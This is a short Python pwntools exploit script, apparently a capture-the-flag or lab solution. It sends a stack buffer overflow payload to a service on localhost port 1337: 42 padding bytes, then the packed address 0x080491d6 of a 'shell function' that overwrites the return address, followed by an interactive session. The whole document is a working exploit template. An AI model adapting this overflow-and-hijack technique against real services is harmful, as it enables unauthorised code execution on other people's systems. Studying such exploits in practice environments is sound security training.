#!/usr/bin/python3

from pwn import *

p = remote("localhost", 1337)

offset = 42 #we got offset using cyclic
secret_adress = p32(0x080491d6) # the adress of the shell function
payload = b"A"*offset + secret_adress # overwrite the return adress pointer

p.sendline(payload)
p.interactive()
p.close()